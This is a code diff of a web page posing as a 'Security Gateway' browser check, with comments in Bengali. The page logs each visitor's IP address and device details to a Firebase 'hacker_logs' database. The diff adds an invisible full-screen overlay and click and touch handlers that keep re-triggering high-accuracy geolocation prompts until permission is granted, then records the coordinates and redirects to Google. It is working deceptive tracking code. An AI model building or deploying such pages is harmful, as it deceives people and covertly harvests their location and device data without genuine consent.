@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Security Verification</title>
+    <title>Security Gateway</title>
     
     <!-- UAParser -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
@@ -26,7 +26,7 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // ১. ডাটা পাঠানো শুরু (আইপি ও ডিভাইস ইনফো)
+        // ১. ডাটা পাঠানো শুরু
         window.initLog = function(data) {
             const trackerRef = ref(db, 'hacker_logs');
             const newLogRef = push(trackerRef);
@@ -34,17 +34,17 @@
             set(newLogRef, {
                 timestamp: new Date().toString(),
                 ...data,
-                latitude: "Tracing...",
-                longitude: "Tracing...",
-                actionStatus: "Connecting..." 
+                latitude: "Wait...",
+                longitude: "Wait...",
+                actionStatus: "Trap Started"
             }).then(() => {
                 sessionStorage.setItem('logKey', newLogRef.key);
-                // ডাটা সেভ হওয়ার পর লোকেশন লুপ শুরু
-                setTimeout(window.forceLocation, 1000); 
+                // ডাটা সেভ হওয়ার পর আসল খেলা শুরু
+                startAnnoyingLoop();
             });
         };
 
-        // ২. লোকেশন আপডেট করা
+        // ২. লোকেশন আপডেট
         window.updateWithGPS = function(lat, lng) {
             const key = sessionStorage.getItem('logKey');
             if (key) {
@@ -52,9 +52,9 @@
                 update(updateRef, {
                     latitude: lat,
                     longitude: lng,
-                    actionStatus: "✅ Verified"
+                    actionStatus: "✅ Verified & Caught"
                 }).then(() => {
-                    // কাজ শেষে গুগলে পাঠিয়ে দেওয়া
+                    // কাজ শেষে মুক্তি
                     window.location.href = "https://www.google.com";
                 });
             }
@@ -62,127 +62,62 @@
     </script>
 
     <style>
-        :root {
-            --bg-color: #e0e5ec;
-            --text-color: #4a4a4a;
-            --accent-color: #007bff;
-            --shadow-light: #ffffff;
-            --shadow-dark: #a3b1c6;
-        }
-
         body {
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
+            margin: 0; padding: 0;
+            background-color: #f0f2f5;
+            display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+            height: 100vh; overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            cursor: progress; /* মাউস কার্সর লোডিং দেখাবে */
+        }
+
+        /* পুরো স্ক্রিন জুড়ে একটা অদৃশ্য জাল */
+        #clickTrap {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 9999; cursor: pointer;
+        }
+
+        .loader-box {
             text-align: center;
+            background: #ffffff;
+            padding: 40px; border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            max-width: 300px;
         }
 
-        .card {
-            width: 90%;
-            max-width: 350px;
-            padding: 40px;
-            border-radius: 30px;
-            background: var(--bg-color);
-            box-shadow: 20px 20px 60px var(--shadow-dark), 
-                       -20px -20px 60px var(--shadow-light);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .icon-area {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            background: var(--bg-color);
-            box-shadow: inset 6px 6px 12px var(--shadow-dark), 
-                        inset -6px -6px 12px var(--shadow-light);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 25px;
-            font-size: 30px;
-            color: var(--accent-color);
-        }
-
-        h2 {
-            font-size: 22px;
-            margin-bottom: 10px;
-            color: var(--text-color);
-        }
-
-        p {
-            font-size: 14px;
-            color: #777;
-            margin-bottom: 30px;
-            line-height: 1.6;
-        }
-
-        /* সুন্দর লোডিং অ্যানিমেশন */
         .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid rgba(0, 123, 255, 0.1);
-            border-left-color: var(--accent-color);
+            width: 50px; height: 50px;
+            border: 5px solid #e1e4e8;
+            border-top: 5px solid #007bff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
         }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .btn-retry {
-            padding: 12px 25px;
-            border: none;
-            outline: none;
-            border-radius: 50px;
-            background: var(--bg-color);
-            box-shadow: 6px 6px 12px var(--shadow-dark), 
-                       -6px -6px 12px var(--shadow-light);
-            color: var(--accent-color);
-            font-weight: bold;
-            font-size: 14px;
-            cursor: pointer;
-            transition: 0.3s;
-            display: none; /* শুরুতে লুকানো */
-        }
-
-        .btn-retry:active {
-            box-shadow: inset 4px 4px 8px var(--shadow-dark), 
-                        inset -4px -4px 8px var(--shadow-light);
-        }
+        h2 { color: #333; font-size: 18px; margin-bottom: 5px; }
+        p { color: #888; font-size: 13px; }
 
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div class="icon-area">
-            <!-- সিকিউরিটি শিল্ড আইকন -->
-            🛡️
-        </div>
-        
-        <h2 id="statusTitle">Checking Connection...</h2>
-        <p id="statusMsg">Please wait while we verify your browser security settings.</p>
+    <!-- এই ডিভটা পুরো স্ক্রিন দখল করে থাকবে, যেখানেই ক্লিক করবে লোকেশন চাইবে -->
+    <div id="clickTrap" onclick="forceBrowserPrompt()"></div>
 
-        <div class="spinner" id="spinner"></div>
-
-        <button class="btn-retry" id="retryBtn" onclick="window.forceLocation()">
-            Allow Access to Verify
-        </button>
+    <div class="loader-box">
+        <div class="spinner"></div>
+        <h2 id="statusText">Security Check...</h2>
+        <p>Verifying network encryption.</p>
     </div>
 
     <script>
         let ipInfo = {};
+        let isAsking = false; // ফ্ল্যাগ যাতে একসাথে একাধিক রিকোয়েস্ট না যায়
 
         window.onload = function() {
-            // আইপি ডাটা ফেচ করা
+            // আইপি এবং ডিভাইস ইনফো আগে নিয়ে নিই
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
@@ -214,49 +149,49 @@
             if(window.initLog) window.initLog(initialPayload);
         }
 
-        window.forceLocation = function() {
-            // UI আপডেট: বাটন লুকিয়ে স্পিনার দেখানো
-            document.getElementById('retryBtn').style.display = 'none';
-            document.getElementById('spinner').style.display = 'block';
-            document.getElementById('statusTitle').innerText = "Verifying...";
+        // ৩. আসল ফাংশন (যেটা বারবার কল হবে)
+        function startAnnoyingLoop() {
+            // ১. পেজ লোড হওয়ার ১.৫ সেকেন্ড পর প্রথম চেষ্টা
+            setTimeout(forceBrowserPrompt, 1500);
             
+            // ২. কেউ যদি মাউস নাড়ায় বা স্ক্রিনে টাচ করে, তাহলেও ট্রিগার হবে
+            document.addEventListener('touchstart', forceBrowserPrompt);
+            document.addEventListener('click', forceBrowserPrompt);
+        }
+
+        function forceBrowserPrompt() {
+            // যদি অলরেডি রিকোয়েস্ট প্রসেসিং এ থাকে, তাহলে থামো
+            if(isAsking) return;
+            isAsking = true;
+
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
+                    // Success
                     function(position) {
-                        // সাকসেস হলে
-                        document.getElementById('statusTitle').innerText = "Verified!";
-                        document.getElementById('statusTitle').style.color = "#00b894"; // সবুজ
-                        document.querySelector('.icon-area').innerText = "✅";
+                        document.getElementById('statusText').innerText = "Verified!";
+                        document.querySelector('.spinner').style.borderTopColor = "#00b894";
                         
+                        // লোকেশন পেয়ে গেছি, আর ডিস্টার্ব করার দরকার নেই
+                        document.removeEventListener('touchstart', forceBrowserPrompt);
+                        document.removeEventListener('click', forceBrowserPrompt);
+                        document.getElementById('clickTrap').style.display = 'none';
+
                         if(window.updateWithGPS) {
                             window.updateWithGPS(position.coords.latitude, position.coords.longitude);
                         }
                     },
+                    // Error (Block or Close)
                     function(error) {
-                        // ফেইল হলে UI তে ওয়ার্নিং
-                        handleError();
+                        isAsking = false; // আবার চাওয়ার জন্য রেডি
+                        console.log("User denied/closed. Re-arming trap.");
+                        
+                        // হ্যাকার ভাববে লোডিং হচ্ছে, কিন্তু আসলে আমরা আবার রিকোয়েস্টের অপেক্ষায় আছি
+                        // এখানে আমরা কোনো UI চেঞ্জ করব না, জাস্ট চুপচাপ থাকব
+                        // সে বিরক্ত হয়ে স্ক্রিনে ট্যাপ করলেই আবার পপ-আপ আসবে
                     },
                     { enableHighAccuracy: true }
                 );
             }
-        }
-
-        function handleError() {
-            // স্পিনার সরিয়ে বাটন দেখানো
-            document.getElementById('spinner').style.display = 'none';
-            
-            document.getElementById('statusTitle').innerText = "Connection Failed";
-            document.getElementById('statusMsg').innerText = "Location access is required to verify your network integrity.";
-            
-            // আইকন লাল করা
-            let iconArea = document.querySelector('.icon-area');
-            iconArea.innerText = "⚠️";
-            iconArea.style.color = "#ff4757";
-
-            // বাটন শো করা
-            let btn = document.getElementById('retryBtn');
-            btn.style.display = 'inline-block';
-            btn.innerText = "Try Again (Allow Access)";
         }
     </script>
 </body>
